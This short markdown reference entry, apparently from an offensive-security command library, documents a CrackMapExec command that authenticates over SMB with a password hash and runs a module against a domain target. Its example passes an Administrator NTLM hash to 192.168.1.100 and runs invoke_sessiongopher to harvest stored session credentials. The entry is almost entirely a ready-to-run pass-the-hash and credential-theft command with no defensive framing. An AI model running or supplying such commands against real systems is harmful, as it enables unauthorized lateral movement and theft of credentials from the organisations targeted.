---
type: command
executor: bash
data: cme smb $_TARGET -u $_USER -H $_HASH -d $_DOMAIN -M $_MODULE
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - smb
  - domain
verified: true
validated: true
---

# cme-smb-run-module-with-domain

## Command

```bash
cme smb $_TARGET -u $_USER -H $_HASH -d $_DOMAIN -M $_MODULE
```

## Description

Runs SMB module with domain context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target | Yes |
| -u $_USER | User | Yes |
| -H $_HASH | Hash | Yes |
| -d $_DOMAIN | Domain | Yes |
| -M $_MODULE | Module | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.100 -u Administrator -H ':5858d47a...' -d EXAMPLE -M invoke_sessiongopher
```

## Expected Output

Module output, e.g., session data.

## Related

- [[tools/CrackMapExec]]
